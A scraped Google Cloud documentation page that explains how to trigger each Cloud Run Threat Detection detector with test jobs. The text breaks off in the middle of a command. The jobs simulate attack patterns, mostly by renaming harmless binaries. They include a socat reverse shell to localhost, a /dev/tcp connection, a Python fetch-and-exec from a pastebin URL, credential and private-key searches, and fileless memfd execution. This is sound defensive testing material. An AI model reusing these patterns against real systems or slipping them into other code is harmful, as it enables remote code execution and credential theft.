---
url: https://docs.cloud.google.com/security-command-center/docs/how-to-test-cloud-run-threat-detection/
title: Test Cloud Run Threat Detection \u00a0|\u00a0 Security Command Center \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-23T11:33:46.055725+00:00
---

# Test Cloud Run Threat Detection  |  Security Command Center  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/security-command-center/docs/how-to-test-cloud-run-threat-detection/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Security ](https://docs.cloud.google.com/docs/security)
  * [ Security Command Center ](https://docs.cloud.google.com/security-command-center/docs)
  * [ Guides ](https://docs.cloud.google.com/security-command-center/docs/security-command-center-overview)



Send feedback 

#  Test Cloud Run Threat Detection Stay organized with collections  Save and categorize content based on your preferences. 

Premium and Enterprise (Deprecated) [service tiers](https://docs.cloud.google.com/security-command-center/docs/service-tiers) The Security Command Center Enterprise service tier will shut down on May 21, 2027. If your organization uses the Enterprise service tier, then the organization will automatically move to the Premium service tier on or after May 21, 2027. Contact your account representative or a [Google Cloud sales specialist](https://cloud.google.com/contact) if you have questions. 

This page explains how to verify that Cloud Run Threat Detection is working by intentionally triggering detectors and checking for findings. Cloud Run Threat Detection is a built-in service of Security Command Center.

## Before you begin

To detect potential threats to your Cloud Run services and jobs, ensure that the **Cloud Run Threat Detection** [service is enabled](https://docs.cloud.google.com/security-command-center/docs/use-cloud-run-threat-detection#enable-disable) in Security Command Center. Some detectors are disabled by default. To test those detectors, you must first [enable them](https://docs.cloud.google.com/security-command-center/docs/use-cloud-run-threat-detection#module).

## Set environment variables

To test detectors, use the Google Cloud console and Cloud Shell. You can set environment variables in Cloud Shell to make it more convenient to run commands. You will use these variables to test all detectors.

  1. Go to the [Google Cloud console](https://console.cloud.google.com/projectselector2).

[Go to the Google Cloud console](https://console.cloud.google.com/projectselector2)

  2. Select the project that contains the Cloud Run job that you want to use to test.

  3. Click **Activate Cloud Shell**. ![](https://docs.cloud.google.com/static/security-command-center/images/activate-cloud-shell.svg)

  4. In Cloud Shell, set the environment variables:

     1. Set the project and region where you will create test jobs.
            
            export PROJECT=PROJECT_ID
            export REGION=REGION
            




With the environment variables set, you can continue to follow the instructions for testing detectors.

## Command and Control: Steganography Tool Detected

To trigger a `Command and Control: Steganography Tool Detected` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, execute a binary with file manipulation capabilities consistent with steganography tools within a container. This example copies `/bin/ls` and renames it to `steghide`.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-steganography-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/steghide; sleep 60; /tmp/steghide; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Command and Control: Steganography Tool Detected` finding.

## Credential Access: Find Google Cloud Credentials

To trigger a `Credential Access: Find Google Cloud Credentials` finding, execute a binary capable of searching file contents within a container. This example copies `/bin/ls`, renames it to `grep`, and executes it with suspicious arguments.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-find-creds-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/grep; sleep 60; /tmp/grep GOOGLE_APPLICATION_CREDENTIALS; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Credential Access: Find Google Cloud Credentials` finding.

## Credential Access: GPG Key Reconnaissance

To trigger a `Credential Access: GPG Key Reconnaissance` finding, execute a search tool with suspicious arguments.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-gpg-key-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/find; sleep 60; /tmp/find secring.gpg; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Credential Access: GPG Key Reconnaissance` finding.

## Credential Access: Search Private Keys or Passwords

To trigger a `Credential Access: Search Private Keys or Passwords` finding, execute a search tool with suspicious arguments.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-search-keys-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/find; sleep 60; /tmp/find id_rsa; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Credential Access: Search Private Keys or Passwords` finding.

## Defense Evasion: Base64 ELF File Command Line

To trigger a `Defense Evasion: Base64 ELF File Command Line` finding, execute `base64` with encoded `ELF` header arguments.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-base64-elf-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; base64 -d f0VMRgIB; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure should create two `Defense Evasion: Base64 ELF File Command Line` findings.

## Defense Evasion: Base64 Encoded Python Script Executed

To trigger a `Defense Evasion: Base64 Encoded Python Script Executed` finding, execute `echo` with an encoded Python command.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-base64-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; base64 aW1wb3J0IH; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Defense Evasion: Base64 Encoded Python Script Executed` finding.

## Defense Evasion: Base64 Encoded Shell Script Executed

To trigger a `Defense Evasion: Base64 Encoded Shell Script Executed` finding, execute `echo` with an encoded shell command.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-base64-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; base64 IyEvYmluL3NoC; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Defense Evasion: Base64 Encoded Shell Script Executed` finding.

## Defense Evasion: Launch Code Compiler Tool In Container

To trigger a `Defense Evasion: Launch Code Compiler Tool In Container` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, execute a compiler tool.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-launch-compiler-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/gcc10; sleep 60; /tmp/gcc10 -o /tmp/gcc10.o; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Defense Evasion: Launch Code Compiler Tool In Container` finding.

## Execution: Added Malicious Binary Executed

To trigger an `Execution: Added Malicious Binary Executed` finding, add a malicious binary (EICAR) to your container and execute it.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-added-malicious-bin-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","echo -n '$eicar' > /tmp/test_mal_file; chmod 700 /tmp/test_mal_file; sleep 60; /tmp/test_mal_file; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Added Malicious Binary Executed` finding.

## Execution: Added Malicious Library Loaded

To trigger an `Execution: Added Malicious Library Loaded` finding, add a malicious library in your container and load it. This example updates the `/tmp/test_mal_lib` file with a simulated malicious library, and then loads it using `mmap`. The library loading of an existing file is unexpected because the file was not in the original container image and the library is an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) test file, which is classified as malicious by threat intelligence.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-add-malicious-lib-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    cat << 'EOF2' > JOB_NAME.sh
    apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1
    echo -n 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/test_mal_lib
    cat << 'EOF' > /tmp/loader.c
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <stdlib.h>
    int main(int argc, char *argv[]) {
       int fd = open(argv[1], O_RDONLY);
       if (fd == -1) return 1;
       struct stat sb;
       if (fstat(fd, &sb) == -1) return 1;
       void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
       if (addr == MAP_FAILED) return 1;
       write(1, addr, sb.st_size);
       munmap(addr, sb.st_size);
       close(fd);
       return 0;
    }
    EOF
    gcc /tmp/loader.c -o /tmp/loader
    sleep 30
    /tmp/loader /tmp/test_mal_lib
    sleep 10
    EOF2
    ENCODED_SCRIPT=$(base64 -w 0 JOB_NAME.sh)
    rm -f JOB_NAME.sh
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","echo $ENCODED_SCRIPT | base64 -d | bash" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Added Malicious Library Loaded` finding.

## Execution: Container Escape

To trigger an `Execution: Container Escape` finding, execute a tool simulating container escape behavior.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-container-escape-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/botb-linux-amd64; sleep 60; /tmp/botb-linux-amd64 -autopwn; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Container Escape` finding.

## Execution: Fileless Execution in `/memfd:`

To trigger an `Execution: Fileless Execution in /memfd:` finding, execute a process from the `/memfd:` in-memory file system using Python.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-fileless-memfd-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    PYTHON_CODE=$(cat <<EOF
    import os,sys
    f = open('/bin/ls','rb')
    execdata = f.read()
    f.close()
    fd = os.memfd_create('', 0)
    fname = '/proc/self/fd/{}'.format(fd)
    f = open(fname,'wb')
    f.write(execdata)
    f.close()
    args = ['/bin']
    os.execve(fname, args, os.environ)
    EOF
    )
    B64_PAYLOAD=$(echo "$PYTHON_CODE" | base64 -w 0)
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image python:latest \
          --command bash \
          --args "-c","sleep 60; echo $B64_PAYLOAD | base64 -d | python3 ; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Fileless Execution in /memfd:` finding.

## Execution: Kubernetes Attack Tool Execution

To trigger an `Execution: Kubernetes Attack Tool Execution` finding, execute a program that matches a known attack tool.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-k8s-attack-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/amicontained; sleep 60; /tmp/amicontained; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Kubernetes Attack Tool Execution` finding.

## Execution: Local Reconnaissance Tool Execution

To trigger an `Execution: Local Reconnaissance Tool Execution` finding, execute a program that matches a reconnaissance tool.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-local-recon-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","cp /bin/ls /tmp/linenum.sh; sleep 60; /tmp/linenum.sh; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Local Reconnaissance Tool Execution` finding.

## Execution: Malicious Python Executed

To trigger an `Execution: Malicious Python Executed` finding, execute a Python script that mimics malicious behavior.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-malicious-python-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    PYTHON_CODE="import urllib
    import base64
    import os
    
    url = 'https://pastebin.com/raw/Z'
    page = base64.b64decode(urllib.urlopen(url).read())
    page = ''
    f = os.popen(str(page))
    url = 'https://pastebin.com/raw/Z'
    d = 'https://pastebin.com/raw/Z'
    page = base64.b64decode(urllib.urlopen(url).read())
    page = ''
    exec(page)"
    
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/python:latest \
          --task-timeout 700 \
          --command bash \
          --args "-c","sleep 601; python -c \"${PYTHON_CODE}\" ; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Malicious Python Executed` finding. Note that this test can take up to 15 minutes to produce a finding.

## Execution: Modified Malicious Binary Executed

To trigger an `Execution: Modified Malicious Binary Executed` finding, modify a binary to match a known malicious signature (EICAR).

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-mod-malicious-bin-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","echo -n '$eicar' > /etc/issue; chmod 700 /etc/issue; sleep 60; /etc/issue; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Modified Malicious Binary Executed` finding.

## Execution: Modified Malicious Library Loaded

To trigger an `Execution: Modified Malicious Library Loaded` finding, modify an existing file with a malicious library in your container and load it. This example updates the `/etc/issue` file with a simulated malicious library, and then loads it using `mmap`. The library loading of an existing file is unexpected because the library is an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) test file, which is classified as malicious by threat intelligence.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-mod-malicious-lib-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    cat << 'EOF2' > JOB_NAME.sh
    apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1
    echo -n 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /etc/issue
    cat << 'EOF' > /tmp/loader.c
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <stdlib.h>
    int main(int argc, char *argv[]) {
       int fd = open(argv[1], O_RDONLY);
       if (fd == -1) return 1;
       struct stat sb;
       if (fstat(fd, &sb) == -1) return 1;
       void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
       if (addr == MAP_FAILED) return 1;
       write(1, addr, sb.st_size);
       munmap(addr, sb.st_size);
       close(fd);
       return 0;
    }
    EOF
    gcc /tmp/loader.c -o /tmp/loader
    sleep 30
    /tmp/loader /etc/issue
    sleep 10
    EOF2
    ENCODED_SCRIPT=$(base64 -w 0 JOB_NAME.sh)
    rm -f JOB_NAME.sh
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","echo $ENCODED_SCRIPT | base64 -d | bash" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an ``Execution: Modified Malicious Library Loaded` finding.

## Execution: Added Malicious Skill Executed

To trigger an `Execution: Added Malicious Skill Executed` finding, add a malicious skill binary to your container and execute it.

Create and execute the Cloud Run job:
    
    
       b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
       JOB_NAME="crtd-test-added-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
       gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","echo '$b64_payload' | base64 -d > /tmp/test_mal_file; chmod 700 /tmp/test_mal_file; sleep 60; /tmp/test_mal_file; sleep 10; sha256sum /tmp/test_mal_file" \
          --wait
       gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Added Malicious Skill Executed` finding.

## Execution: Modified Malicious Skill Executed

To trigger an `Execution: Modified Malicious Skill Executed` finding, modify a binary to match a known malicious skill signature.

Create and execute the Cloud Run job:
    
    
       b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
       JOB_NAME="crtd-test-mod-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
       gcloud run jobs create $JOB_NAME \
           --project $PROJECT \
           --region $REGION \
           --image marketplace.gcr.io/google/ubuntu2404:latest \
           --command sh \
           --args "-c","echo '$b64_payload' | base64 -d > /etc/issue; chmod 700 /etc/issue; sleep 60; /etc/issue; sleep 10; sha256sum /etc/issue" \
           --wait
       gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Modified Malicious Skill Executed` finding.

## Execution: Added Malicious Skill Loaded

To trigger an `Execution: Added Malicious Skill Loaded` finding, add a malicious skill library in your container and load it. This example updates the `/tmp/test_mal_lib` file with a simulated malicious skill library, and then loads it using `mmap`. The library loading of an existing file is unexpected because the file was not in the original container image and the library contains a specific test hash classified as a malicious skill by threat intelligence.

Create and execute the Cloud Run job:
    
    
    b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
    JOB_NAME="crtd-test-add-malicious-skill-lib-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    cat << EOF2 > ${JOB_NAME}.sh
    apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1
    echo '$b64_payload' | base64 -d > /tmp/test_mal_lib
    chmod 700 /tmp/test_mal_lib
    cat << 'EOF' > /tmp/loader.c
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <stdlib.h>
    int main(int argc, char *argv[]) {
       int fd = open(argv[1], O_RDONLY);
       if (fd == -1) return 1;
       struct stat sb;
       if (fstat(fd, &sb) == -1) return 1;
       void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
       if (addr == MAP_FAILED) return 1;
       write(1, addr, sb.st_size);
       munmap(addr, sb.st_size);
       close(fd);
       return 0;
    }
    EOF
    gcc /tmp/loader.c -o /tmp/loader
    sleep 30
    /tmp/loader /tmp/test_mal_lib
    sleep 10
    sha256sum /tmp/test_mal_lib
    EOF2
    ENCODED_SCRIPT=$(base64 -w 0 ${JOB_NAME}.sh)
    rm -f ${JOB_NAME}.sh
    gcloud run jobs create $JOB_NAME \
       --project $PROJECT \
       --region $REGION \
       --image marketplace.gcr.io/google/ubuntu2404:latest \
       --command bash \
       --args "-c","echo $ENCODED_SCRIPT | base64 -d | bash" \
       --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Added Malicious Skill Loaded` finding.

## Execution: Modified Malicious Skill Loaded

To trigger an `Execution: Modified Malicious Skill Loaded` finding, modify an existing file with a malicious skill library in your container and load it. This example updates the `/etc/issue` file with a simulated malicious skill library, and then loads it using `mmap`. The library loading of an existing file is unexpected because the library contains a specific test hash classified as a malicious skill by threat intelligence.

Create and execute the Cloud Run job:
    
    
    b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
    JOB_NAME="crtd-test-mod-malicious-skill-lib-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    cat << EOF2 > ${JOB_NAME}.sh
    apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1
    echo '$b64_payload' | base64 -d > /etc/issue
    chmod 700 /etc/issue
    cat << 'EOF' > /tmp/loader.c
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <stdlib.h>
    int main(int argc, char *argv[]) {
       int fd = open(argv[1], O_RDONLY);
       if (fd == -1) return 1;
       struct stat sb;
       if (fstat(fd, &sb) == -1) return 1;
       void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
       if (addr == MAP_FAILED) return 1;
       write(1, addr, sb.st_size);
       munmap(addr, sb.st_size);
       close(fd);
       return 0;
    }
    EOF
    gcc /tmp/loader.c -o /tmp/loader
    sleep 30
    /tmp/loader /etc/issue
    sleep 10
    sha256sum /etc/issue
    EOF2
    ENCODED_SCRIPT=$(base64 -w 0 ${JOB_NAME}.sh)
    rm -f ${JOB_NAME}.sh
    gcloud run jobs create $JOB_NAME \
       --project $PROJECT \
       --region $REGION \
       --image marketplace.gcr.io/google/ubuntu2404:latest \
       --command bash \
       --args "-c","echo $ENCODED_SCRIPT | base64 -d | bash" \
       --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Modified Malicious Skill Loaded`` finding.

## Execution: Netcat Remote Code Execution In Container

To trigger an `Execution: Netcat Remote Code Execution In Container` event, execute netcat with suspicious arguments.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-netcat-rce-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","cp /bin/ls /tmp/nc; sleep 60; /tmp/nc -e; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Netcat Remote Code Execution In Container` finding.

## Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)

To trigger an `Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)` finding, execute a script simulating the exploit.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-cups-cve-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c",'sleep 60; cp /bin/bash /tmp/foomatic-rip; echo "#!/tmp/foomatic-rip" >> /tmp/test.sh; echo "sh -c echo hello" >> /tmp/test.sh; chmod +x /tmp/test.sh; /tmp/test.sh; sleep 10' \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)` finding.

## Execution: Possible Remote Command Execution Detected

To trigger an `Execution: Possible Remote Command Execution Detected` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, execute a command attempting a remote connection.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-remote-cmd-exec-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; cp /bin/ls /tmp/touch; echo \"Hello\" | /tmp/touch >& /dev/tcp/8.8.8.8/53; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Possible Remote Command Execution Detected` finding.

## Execution: Program Run with Disallowed HTTP Proxy Env

To trigger an `Execution: Program Run with Disallowed HTTP Proxy Env` finding, execute a program with a bad proxy environment variable.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-http-proxy-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; cp /bin/ls /tmp/curl; HTTP_PROXY=127.0.0.1:8080 /tmp/curl; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Program Run with Disallowed HTTP Proxy Env` finding.

## Execution: Socat Reverse Shell Detected

To trigger an `Execution: Socat Reverse Shell Detected` finding, establish a reverse shell using the `socat` utility.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-socat-rev-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    RAW_SOCAT="timeout 10s /usr/bin/socat TCP-LISTEN:4444,reuseaddr,fork STDOUT & sleep 5 && timeout 5s /usr/bin/socat TCP:127.0.0.1:4444 EXEC:/bin/bash,pty,stderr || true"
    B64_SOCAT=$(echo -n "$RAW_SOCAT" | base64 | tr -d '\n\r ')
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; apt-get update && apt-get install socat -y && echo $B64_SOCAT | base64 -d | bash" \
          --execute-now \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Socat Reverse Shell Detected` finding.

## Execution: Suspicious OpenSSL Shared Object Loaded

To trigger an `Execution: Suspicious OpenSSL Shared Object Loaded` finding, execute `openssl` with a suspicious library.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-openssl-so-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; cp /bin/ls /tmp/openssl; /tmp/openssl engine /tmp/fakelib.so; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Suspicious OpenSSL Shared Object Loaded` finding.

## Exfiltration: Launch Remote File Copy Tools In Container

To trigger an `Exfiltration: Launch Remote File Copy Tools In Container` finding, execute a remote copy tool.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-remote-copy-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; cp /bin/ls /tmp/rsync; /tmp/rsync; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Exfiltration: Launch Remote File Copy Tools In Container` finding.

## Impact: Detect Malicious Cmdlines

To trigger an `Impact: Detect Malicious Cmdlines` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, execute a suspicious command name (IPFS).

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-malicious-cmd-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
